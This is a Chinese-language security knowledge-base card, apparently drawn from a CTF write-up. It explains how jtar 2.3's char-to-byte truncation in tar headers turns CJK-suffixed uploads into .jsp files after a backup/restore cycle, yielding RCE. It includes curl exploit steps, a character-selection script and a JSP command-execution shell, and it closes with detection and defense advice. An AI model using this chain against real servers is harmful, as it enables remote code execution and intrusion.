---
id: web-java-component-tomcat-jtar-tar-name-byte-truncation-jsp-upload
title: Java 备份/恢复链路：jtar 写 tar 头时 char 截断成 byte，中文后缀被压成 .jsp 落进 WEB-INF/views
type: scenario
domain: web
path: web/java/component/tomcat
technique: jtar-tar-header-name-byte-truncation
tags:
- java
- tomcat
- jtar
- tar
- ghost-bits
- cast-attack
- file-upload
- filename-truncation
- jsp
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: org.kamranzafar:jtar 2.3
verification:
  verified_by: verifier-T1-18
  verified_at: '2026-11-08T08:58:53+08:00'
  notes: 已对照原文与17张截图核对：pom 明确写出 org.kamranzafar:jtar 2.3 且 IDE 里为 jtar-2.3.jar，affected_versions 属原文明确标记的组件版本（非 advisory 区间）予以保留；getNameBytes 的 (byte)name.charAt(i) 截断、untar 用 entry.getName() 直接拼路径、黑名单 jsp/jspx/jspf... 均已核图；呪U+546A/乳U+4E73/买U+4E70 低字节 0x6A/0x73/0x70 计算正确；img17 显示 /view 回显 env 且含 FLAG=d3ctf{...}，RCE 实证成立。未验证点：article 未讨论 jtar 其他版本，卡片已用『或任何用 (byte)charAt 写 tar 头的实现』限定。
url: /docs/web/java/component/tomcat/web-java-component-tomcat-jtar-tar-name-byte-truncation-jsp-upload/
draft: false
kb_aliases:
- jtar 文件名截断
- kamranzafar jtar char to byte
- Ghost Bits tar 头
- 备份 tar untar 后缀篡改
- Tomcat 备份恢复 getshell
- 中文后缀绕过上传黑名单
---

## 一句话结论

Java 应用用 jtar 做「上传目录打包 → 解包回原目录」的备份/恢复功能时，`TarHeader.getNameBytes` 用 `(byte) charAt(i)` 写 tar 头，UTF-16 高 8 位被丢弃；上传 `shell.呪乳买`（三字的低字节正好是 `j`/`s`/`p`）能通过扩展名黑名单，打包后归档内的文件名变成 `shell.jsp`，解包回 `WEB-INF/views` 即成为可被框架视图解析器加载执行的 JSP。

## 原理

- **截断点**：jtar 2.3 的 `TarHeader.getNameBytes(StringBuffer name, byte[] buf, int offset, int length)` 逐字符写入 512 字节 tar 头，循环体是 `buf[offset + i] = (byte) name.charAt(i);`。Java `char` 是 16 位 UTF-16 码元，强制转 `byte` 时只保留低 8 位，高 8 位静默丢弃。对 ASCII 文件名无影响，对非 ASCII 文件名则会把字符改写成另一个字节。
- **为什么能绕过黑名单**：扩展名校验发生在**上传时的字符串层面**，看到的是 `.呪乳买`——不在 `jsp/jspx/jspf/jspa/jsw/jsv/jtml/jhtml/sh/xml/war/jar` 黑名单里，放行；落盘名是 `<uuid>.呪乳买`，此时确实不是 JSP，Tomcat 不会编译它。
- **为什么打包会改后缀**：tar 头里的文件名是**字节序列**，不是 Unicode 字符串。打包时一次 `(byte)` 截断把 `呪`(U+546A)→0x6A(`j`)、`乳`(U+4E73)→0x73(`s`)、`买`(U+4E70)→0x70(`p`)，tar 头里写下的就是 `<uuid>.jsp`。检查方（上传）与执行方（归档格式）对同一文件名解码不一致，这就是 Ghost Bits / Cast Attack 的通用形态。
- **为什么解包会落成 JSP**：解包侧 `untar` 用 `new File(outputDirectory + "/" + entry.getName())` 还原文件，`entry.getName()` 直接从 tar 头字节解码而来，已经是 `<uuid>.jsp`；服务端不做扩展名复检、也不校验 `getName()` 是否越界，于是把 JSP 文件写回 `WEB-INF/views`。
- **为什么能执行**：`WEB-INF` 下的 JSP 不能被浏览器直接访问，但应用自己的 `/view?page=<name>` 把 `page` 拼成 `/WEB-INF/views/<page>.jsp` 后用 `ModelAndView` 交给视图解析器转发/包含，最终由 JSP Servlet 编译执行——等于给了攻击者一个「按名字取任意 WEB-INF 视图」的执行入口。三段能力（黑名单可绕、归档改后缀、视图解析器可执行）叠加才构成完整 RCE，缺一段就只剩文件写入。

## 触发条件

- Java 应用使用 jtar 2.3（或任何用 `(byte) charAt(i)` 写 tar 头的归档实现）做备份/恢复、导出/导入。
- 上传接口：文件名被重命名成 `uuid + 原始扩展名`，并对**原始扩展名**做黑名单校验（而不是对落盘后的规范名做白名单）。
- 存在「打包某目录 → 解包回该目录」的成对接口，且目标目录与上传目录一致或可被解包覆盖。
- 目标目录内的 JSP 能被执行（例如应用提供按文件名加载 `WEB-INF/views/*.jsp` 的视图路由）。
- jtar 的截断对**写头和读头**都生效，因此攻击者不需要自己构造 tar 文件，只需上传一个文件名。

## 利用步骤

1. 审计上传路由：确认扩展名黑名单基于原始文件名字符串，且落盘名为 `uuid.<原后缀>`。
2. 审计备份路由：确认 `tar` 打包目录与上传目录相同、`untar` 解包目录也是它，且解包用 `entry.getName()` 直接拼路径、不做扩展名复检。
3. 审计载体：找到能把 `WEB-INF` 下指定 `.jsp` 当视图加载的路由（本例为 `/view?page=<name>`，正则只允许字母数字和 `-`，所以 `page` 只填 uuid）。
4. 查表选字：对 `j`=0x6A、`s`=0x73、`p`=0x70，在 CJK 区找低 8 位相同的字符（`呪` U+546A、`乳` U+4E73、`买` U+4E70），拼出后缀 `呪乳买`。
5. 上传 `shell.呪乳买`，正文为 JSP 代码；记录返回的 `<uuid>.呪乳买`。
6. 调用 `POST /BackUp op=tar` 打包，再 `POST /BackUp op=untar` 解包；归档内条目名被截断为 `<uuid>.jsp`，解包后目录里出现真正的 JSP。
7. 请求 `/view?page=<uuid>` 触发 JSP 编译执行，命令回显。

## PoC

```bash
# 1) 上传：后缀三字低字节依次是 0x6A/0x73/0x70
#    shell.呪乳买  ->  <uuid>.呪乳买
curl -s -F 'file=@shell.jsp.txt;filename=shell.呪乳买' http://target/Upload
# => Upload Success: 48ec95bb-...-26bd8662e28b.呪乳买

# 2) 打包（写 tar 头时 (byte) 截断 -> 条目名 <uuid>.jsp）
curl -s -X POST -d 'op=tar' http://target/BackUp
# 3) 解包回 /WEB-INF/views，落盘 <uuid>.jsp
curl -s -X POST -d 'op=untar' http://target/BackUp

# 4) 用视图路由加载并执行
curl -s 'http://target/view?page=48ec95bb-...-26bd8662e28b'
```

```java
// 选字脚本：列出低 8 位等于 'j' 的汉字
for (char c = 0x4E00; c <= 0x9FFF; c++) {
    if ((c & 0xFF) == 'j') System.out.println(c + " U+" + Integer.toHexString(c));
}
```

```jsp
<%@ page import="java.io.*" %><%
  Process p = Runtime.getRuntime().exec("id");
  BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String l; while ((l = r.readLine()) != null) out.println(l + "<br>");
%>
```

## 变体与关联

- 变体：任何把目标扩展名（`.jsp`、`.war`、`.xml`、`.class`）字符换成低字节相同汉字的场景都成立；`.jspx` 需要四个字。
- 变体：截断点不一定在 jtar——只要归档/打包库用 `(byte)` 或 `write(int)` 写文件名（Python 的 `bytes()`、Go 的 `byte(rune)` 同理），且读回与写回是同一条链路，就可复现。
- 变体：`untar` 未校验 `entry.getName()` 本身也是目录穿越（`../`）成因；本例攻击者无法替换 `backup.tar`（上传一律改名 uuid），所以穿越面在本题未打通，只有「后缀被改」这条链可用。若应用允许上传/覆盖归档文件本身，可升级为任意路径写入。
- 关联：[[web-java-component-tomcat-rfc2231-filename-char-truncation-jsp-upload]]（同一 Ghost Bits 原语，截断点在 Tomcat multipart `filename*` 解析，而非 tar 头）、[[web-generic-file-upload-node-tar-hardlink-linkpath-traversal]]（归档解包的路径边界问题）、[[web-generic-file-upload-keras-tar-filter-symlink-check-order-bypass]]。
- 边界：若上传后统一改为随机无扩展名存放、或备份/恢复只处理固定白名单后缀、或视图路由按白名单枚举页面，则链断。原文环境为 Web 应用 + Tomcat 容器，非 Tomcat 自身漏洞。

## 检测与防御

- 检测：上传文件名含非 ASCII 字符且落盘扩展名与报文不一致；同一会话内短时间内连续调用 `tar` 与 `untar`；备份目录中新出现 `.jsp/.war/.class`；`/view` 类路由的 `page` 参数被批量枚举 uuid。
- 防御：扩展名校验改到**落盘后的规范文件名**上做白名单；上传文件重命名为无扩展名随机名并把内容存到不可执行目录；归档库升级到不做 `char→byte` 截断的版本，或在写头前显式按 UTF-8 编码并校验文件名长度与字符集；解包时校验 `entry.getName()` 归一化后仍在目标目录内，并按白名单还原扩展名；视图路由不要用用户可控名字拼 `WEB-INF` 路径。
